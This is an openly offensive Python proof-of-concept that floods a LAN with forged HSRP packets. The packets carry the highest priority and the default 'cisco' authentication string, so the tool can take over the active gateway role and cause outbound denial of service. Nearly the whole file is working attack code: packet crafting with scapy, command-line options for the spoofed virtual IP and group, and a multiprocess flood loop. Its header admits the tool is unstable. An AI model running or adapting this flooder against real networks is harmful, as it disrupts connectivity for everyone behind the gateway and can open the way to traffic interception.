#!/usr/bin/python

#
# Proof-of-concept HSRP Active router Flooder triggering outbound gateway Denial of Service. Not fully tested, not working stabily at the moment.
#
# Python requirements:
#   - scapy
#
# Mariusz Banach / mgeeky, '18, <mb@binary-offensive.com>
#

import sys
import struct
import string
import random
import argparse
import multiprocessing

import socket
import fcntl
import struct

try:
    from scapy.all import *
except ImportError:
    print('[!] Scapy required: pip install scapy')
    sys.exit(1)
 
VERSION = '0.1'

config = {
    'verbose' : False,
    'interface' : None,
    'processors' : 1,

    # HSRP Fields
    'group' : 1,
    'priority' : 255,
    'virtual-ip' : '',
    'source-ip' : '',
    'dest-ip' : '224.0.0.2',
    'auth' : 'cisco\x00\x00\x00',
}

stopThreads = False


#
# ===============================================
#

class Logger:
    @staticmethod
    def _out(x): 
        if config['verbose']: 
            sys.stdout.write(x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[.] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[?] ' + x)
    
    @staticmethod
    def err(x): 
        sys.stdout.write('[!] ' + x + '\n')
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)

def generatePacket():
    ip = IP()
    ip.src = config['source-ip']
    ip.dst = config['dest-ip']

    udp = UDP()
    udp.sport = 1985
    udp.dport = 1985
    
    hsrp = HSRP()
    hsrp.version = 0
    hsrp.opcode = 1
    hsrp.group = config['group']
    hsrp.priority = config['priority']
    hsrp.virtualIP = config['virtual-ip']
    hsrp.auth = config['auth']

    hsrppacket = ip / udp / hsrp
    return hsrppacket

def flooder(num):
    Logger.info('Starting task: {}'.format(num))

    while stopThreads != True:
        try:
            p = generatePacket()
            if stopThreads: raise KeyboardInterrupt
            send(p, verbose = config['verbose'], iface = config['interface'])
        except KeyboardInterrupt:
            break

    Logger.info('Stopping task: {}'.format(num))

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])
 
def parseOptions(argv):
    global config

    print('''
        :: HSRP Flooding / Denial of Service tool
        Floods the interface with Active router Coup HSRP packets.
        Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
        v{}
'''.format(VERSION))

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options]')
    parser.add_argument('-I', '--interface', metavar='DEV', default='', help='Select interface on which to operate.')
    parser.add_argument('-s', '--source', metavar='SRC', default='', help='Specify source IP address. By default: own IP')
    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')

    hsrp = parser.add_argument_group('HSRP Fields', 'Specifies contents of interesting HSRP fields in packets to send')
    hsrp.add_argument('-g', '--group', help = 'Group number. Default: 1')
    hsrp.add_argument('-p', '--priority', help = 'Active router priority. Default: 255')
    hsrp.add_argument('-i', '--virtual-ip', dest='virtualip', help = 'Virtual IP of the gateway to spoof.')
    hsrp.add_argument('-a', '--auth', help = 'Authentication string. Default: cisco')

    args = parser.parse_args()

    if not args.interface:
        print('[!] Interface option is mandatory.')
        sys.exit(-1)

    config['verbose'] = args.verbose
    config['interface'] = args.interface
    #config['processors'] = multiprocessing.cpu_count()

    if args.group: config['group'] = args.group
    if args.priority: config['priority'] = args.priority
    if args.virtualip: config['virtual-ip'] = args.virtualip
    if args.auth: config['auth'] = args.auth
    if args.source: config['source-ip'] = args.source
    else: config['source-ip'] = get_ip_address(config['interface'])

    print('Using source IP address: {}'.format(config['source-ip']))

    return args

def main(argv):
    global stopThreads

    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    if os.getuid() != 0:
        Logger.err('This program must be run as root.')
        return False

    jobs = []
    for i in range(config['processors']):
        task = multiprocessing.Process(target = flooder, args = (i,))
        jobs.append(task)
        task.daemon = True
        task.start()

    print('[+] Started flooding on dev: {}. Press CTRL-C to stop that.'.format(config['interface']))
    try:
        while jobs:
            jobs = [job for job in jobs if job.is_alive()]
    except KeyboardInterrupt:
        stopThreads = True
        print('\n[>] Stopping...')

    stopThreads = True
    time.sleep(3)

if __name__ == '__main__':
    main(sys.argv)
